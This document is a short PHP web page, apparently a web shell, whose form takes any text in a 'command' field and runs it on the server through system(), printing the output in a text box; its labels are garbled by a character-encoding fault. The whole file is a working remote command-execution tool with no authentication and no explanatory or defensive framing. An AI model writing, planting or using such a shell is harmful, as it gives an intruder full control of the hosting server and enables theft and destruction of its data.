<html>
<head>
<title></title>
</head>
<body>

<form name="myform" action="<?php echo $PHP_SELF ?>" method="post">
<p>CMD����:</p>
<input type="text" name="command" size="60" <?php if ($command) { echo "value=\"$command\"";} ?> >
<input name="submit_btn" type="submit" value="����CMD����"></p>
<p>������:</p>
<textarea cols="80" rows="20" readonly>
<?php
if ($command) {
system($command);
}
?>
</textarea>
</form>
</body>
</html>